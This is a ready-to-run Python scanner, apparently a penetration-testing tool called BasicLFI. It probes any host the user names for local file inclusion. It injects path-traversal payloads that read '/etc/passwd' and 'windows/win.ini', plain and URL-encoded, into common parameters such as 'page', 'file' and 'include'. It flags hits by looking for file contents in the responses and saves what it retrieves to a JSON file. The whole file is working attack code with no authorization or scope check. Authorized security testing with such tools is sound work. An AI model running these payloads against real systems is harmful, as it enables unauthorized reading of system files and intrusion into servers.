#!/usr/bin/env python3

import argparse
import requests
import urllib.parse
from tqdm import tqdm
import json
import sys

# Colors for terminal output
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Banner for the tool
BANNER = f"""{CYAN}
    ╔═══════════════════════════════════════════════╗
    ║     🐍 BasicLFI - Local File Inclusion Scanner ║
    ║           v1.0 by xploitnik                  ║
    ╚═══════════════════════════════════════════════╝
{RESET}"""

# Default payloads for the LFI test
DEFAULT_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
]

# Common parameters for URL paths
COMMON_PARAMS = ["page", "file", "path", "lang", "template", "inc", "include"]

# Parse the command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(
        description="Quick LFI Scanner",
        epilog="Example usage:\n"
               "./BasicLFI.py http target.com\n"
               "./BasicLFI.py https target.com\n"
               "./BasicLFI.py http target.com --proxy http://127.0.0.1:8080\n"
               "./BasicLFI.py http target.com --payloads '../../../../../../../../etc/passwd,..%2f..%2f..'"
    )
    parser.add_argument("scheme", help="Protocol (http or https)")
    parser.add_argument("host", help="Target host (e.g., target.com)")
    parser.add_argument("--proxy", help="Optional proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--payloads", help="Comma-separated list of custom payloads")
    parser.add_argument("--output", help="Output file for logs", default="lfi_scan_results.json")
    parser.add_argument("--timeout", help="Timeout for each request", type=int, default=5)
    return parser.parse_args()

# Load the payloads, either custom or default
def load_payloads(custom_payloads):
    if custom_payloads:
        return custom_payloads.split(",")
    return DEFAULT_PAYLOADS

# Try LFI vulnerability with the given parameters
def try_lfi(url, param, payload, proxy, timeout):
    full_url = f"{url}/?{param}={urllib.parse.quote(payload)}"
    try:
        r = requests.get(full_url, proxies=proxy, timeout=timeout)
        if "root:x" in r.text or "[extensions]" in r.text:
            return True, full_url, r.text[:200]
    except requests.RequestException:
        pass
    return False, full_url, ""

# Main function
def main():
    # Print the banner
    print(BANNER)

    # Parse the arguments
    args = parse_args()

    # Construct the target URL
    url = f"{args.scheme}://{args.host}"
    print(f"{GREEN}[+] Target: {url}{RESET}\n")

    # Set up proxy if provided
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    # Load payloads (either default or custom)
    payloads = load_payloads(args.payloads)

    # List to store found vulnerabilities
    found = []

    # Scanning common parameter names for LFI vulnerabilities
    print(f"{GREEN}[+] Scanning using common parameter names...{RESET}")
    for param in tqdm(COMMON_PARAMS, desc="Scanning", ncols=100):
        for payload in payloads:
            success, full_url, preview = try_lfi(url, param, payload, proxy, args.timeout)
            if success:
                # Print the encoded and decoded LFI URL
                print(f"{RED}[!] LFI Found!{RESET}")
                print(f"    {YELLOW}Encoded : {full_url}{RESET}")
                print(f"    {YELLOW}Decoded : {urllib.parse.unquote(full_url)}{RESET}")

                # Append the results
                found.append({"url": full_url, "preview": preview})

    # If vulnerabilities were found, save the results to a JSON file
    if found:
        with open(args.output, "w") as f:
            json.dump(found, f, indent=2)
        print(f"\n{GREEN}[+] LFI vulnerabilities discovered! Results saved to {args.output}{RESET}")
    else:
        print(f"\n{RED}[-] No LFI vulnerabilities discovered. No data saved.{RESET}")

# Entry point of the script
if __name__ == "__main__":
    main()
